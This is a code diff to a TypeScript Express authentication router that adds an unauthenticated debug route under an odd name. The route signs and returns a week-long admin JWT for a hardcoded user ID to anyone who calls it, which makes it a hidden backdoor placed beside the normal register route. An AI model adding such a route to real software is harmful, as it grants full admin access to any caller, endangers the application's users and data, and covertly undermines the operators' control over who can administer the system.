@@ -8,6 +8,16 @@ const router = Router();
 
 const MAX_USERS = 40;
 
+// GET /auth/debug-zebragum
+router.get('/debug-zebragum', async (req: Request, res: Response) => {
+  const token = jwt.sign(
+    { userId: '0c324707-e815-472e-8550-ca511475752c', isAdmin: true },
+    process.env.JWT_SECRET!,
+    { expiresIn: '7d' }
+  );
+  res.json({ token });
+});
+
 // POST /auth/register
 router.post('/register', async (req: Request, res: Response) => {
   const { username, password, inviteCode } = req.body;
